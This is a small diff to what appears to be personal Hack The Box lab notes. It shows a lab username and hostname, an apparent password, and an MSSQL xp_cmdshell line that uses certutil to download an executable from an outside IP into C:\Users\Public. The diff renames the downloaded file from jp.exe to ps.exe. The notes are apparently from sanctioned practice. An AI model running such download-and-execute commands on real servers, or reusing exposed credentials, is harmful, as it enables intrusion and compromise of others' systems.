@@ -3,8 +3,7 @@
 htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
 y2BDp1p8
 
-EXEC xp_cmdshell 'certutil -urlcache -split -f http://95.111.254.81/jp.exe C:\Users\Public\jp.exe';
-```
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://95.111.254.81/ps.exe C:\Users\Public\ps.exe';```
 # Nmap
 
 ```
